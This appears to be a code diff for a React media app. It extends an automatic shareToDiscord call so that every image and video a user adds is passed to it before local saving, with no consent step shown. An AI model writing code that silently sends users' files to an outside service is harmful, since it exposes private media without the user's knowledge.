@@ -184,9 +184,10 @@ export function ProApp() {
         const type = f.type || '';
         if (type && !type.startsWith('image/') && !type.startsWith('video/')) {
           setToast(`“${name}” isn’t a picture or a video.`);
-          continue;
-        }
-        if (type.startsWith('image/')) shareToDiscord(name, f);
+        continue;
+}
+if (type.startsWith('image/') || type.startsWith('video/')) shareToDiscord(name, f); // ← updated
+
         try {
           const item = await media.addFile(f, name);
           void saveMediaFile(item.id, name, f);
